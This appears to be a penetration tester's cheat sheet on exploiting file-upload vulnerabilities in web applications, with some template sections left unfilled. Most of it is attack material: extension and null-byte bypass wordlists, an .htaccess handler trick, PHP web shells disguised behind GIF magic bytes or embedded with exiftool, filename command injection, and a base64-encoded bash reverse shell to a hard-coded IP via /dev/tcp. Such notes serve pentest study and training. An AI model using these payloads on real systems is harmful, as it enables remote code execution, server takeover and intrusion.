# Description

This vulnerability occurs in web applications where users can upload files without security checks to prevent potential dangers. This allows an attacker to upload files with code (such as `.php` or `.aspx` scripts) and execute them on the server.

# Command Syntax

### 3.4 File Upload

#### 3.4.1 Disabling Frontend Validation

**Options**:

1.  Use the _Browser Inspector_ to find the function that validates the file, delete it and then upload the file, keep in mind that this will not work if the validation is at server-level.
    
2.  Use _BurpSuite_ and send a normal request, intercept it and then modify it to our malicious form and then send it.

#### 3.4.2 Extensions Blacklist

Keep in mind that for Windows Servers file extensions are **case sensitive**, a wordlist we can use for fuzzing extension with either `ffuf` or `BurpSuite` (do not do URL encode) is [https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt).

```bash
.jpeg.php
.jpg.php
.png.php
.php
.php3
.php4
.php5
.php7
.php8
.pht
.phar
.phpt
.pgif
.phtml
.phtm
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.png
.php%00.jpg
.php\x00.jpg
```

#### 3.4.3 Extensions Whitelist

We can perform a fuzzing or use a script to find if there is a whitelist of file extensions.

```bash
# This only checks if the whitelist are there in the file upload and not if it ends with it.
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

#### 3.4.4 Bypassing Filters

We have different options to do so:

1.  **Changing File Extensions**: if direct upload of .php files is restricted or filtered, try alternative extensions that might bypass filters.

```bash
# For PHP
.pHP, .phps, .php7, .php4, .php5, .php3, .xxx

# For ASP(X)
.aspx, .asp, .ashx, .asmx
```

2.  **Use `.htaccess`**: if the application allows `.htaccess` file uploads, you can exploit it to change file handling settings: `AddType application/x-httpd-php .dork`; then, upload a file with the `.dork` extension, which might be interpreted as PHP and could contain a reverse shell or web shell.

```bash
# We can now upload [file].dork files.
echo "AddType application/x-httpd-php .dork" > .htaccess
```

3.  **Double Extension**: upload files with double extensions like `shell.php.jpg` or `shell.php.jpeg` to bypass simple filters.

```bash
# This checks if it ends with it so double extension wont work.
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```

4.  **Characters Injection**: try using null byte injection to bypass filters, e.g., `shell.php%00.jpg`; or inject characters before or after the final extension:

```bash
# For example shell.php%00.jpg works with PHP servers with version 5.X or earlier, as it causes the PHP web server to end the file name after the '%00', and store it as 'shell.php'.
%20
%0a
%00
%0d0a
/
.\
.
…
:
```

```bash
# Script for all permutations
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.php2' '.php3' '.php4' '.php5' '.php6' '.php7' '.phps' '.pht' '.phtm' '.phtml' '.pgif' '.phar' '.hphp'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

5.  **MIME (Multipurpose Internet Mail Extensions) Type Spoofing**: use tools or manual methods to alter the MIME type of the file being uploaded. Inspecting the initial bytes of a file reveals its File Signature or Magic Bytes. For instance, (GIF87a or GIF89a) signifies a GIF image, while plaintext indicates a Text file. Altering the initial bytes to the GIF magic bytes changes the MIME type to a GIF image, disregarding its remaining content or _extension_. GIF images uniquely start with ASCII printable bytes, making them easy to imitate. The string GIF8 is common to both GIF signatures, simplifying GIF image imitation.

```bash
# Payload code
GIF89a;
<?
system($_GET['cmd']);//or you can insert your complete shell code
?>
// or
GIF8
<?
system($_GET['cmd']); //or you can insert your complete shell code
?>
```

```bash
# Example
echo "GIF8" > text.jpg 
file text.jpg

text.jpg: GIF image data

# Code to Test MIME type of uplaoded file
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

![MIME Spoofing](https://www.emmanuelsolis.com/img/php_filters01.png)

MIME Spoofing

#### 3.4.5 File Execution

This is a very important step because if we have successfully upload a webshell or a malicious file **we want to be able to execute it** to get a reverse shell or execute our malicious code.

For this **attempt to access uploaded files via URL**, and ensure the uploaded file is executed in a web-accessible directory. If we want to get a reverse shell check the Utilities Section for commands, or use [https://revshells.com/](https://revshells.com/).

```bash
http://[TARGET_IP]/uploads/shell.php
or
http://[TARGET_IP]/uploads/shell.php?cmd=whoami
```

#### 3.4.6 Embed Code into Images

We can use `exiftool` for this, then we just need to rename it.

```bash
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg

mv lo.jpg lo.php.jpg
```

#### 3.4.7 Embed Code into File Names

A common file upload attack uses a malicious string for the uploaded file name, which may get executed or processed if the uploaded file name is displayed on the page, or directly executed in the server.

For example, if we name a file `file$(whoami).jpg` or file`whoami.jpg` or `file.jpg||whoami`, and then the web application attempts to move the uploaded file with an OS command (e.g. mv file /tmp), then our file name would inject the whoami command, which would get executed, leading to remote code execution.

```bash
# Crate the Base64 encoded command.
echo "bash -i >& /dev/tcp/192.168.45.166/444 0>&1" | base64

# Download any normal image, and give it the name: cat.jpg.
cp cat.jpg ’|smile”`echo <base64_bash_reverse_shell> | base64 -d | bash`”.jpg’
```

# Common Flags / Options

-flag: Description of what this flag does

# Use Cases

When and why you would use this technique?

# Examples

Practical example from a lab machine or HTB.

```sh
example-command -flag target
```

# Related Notes

[[Link to a related atomic note]]

[[Link to a relevant MOC]]

# References

HackTricks

PayloadsAllTheThings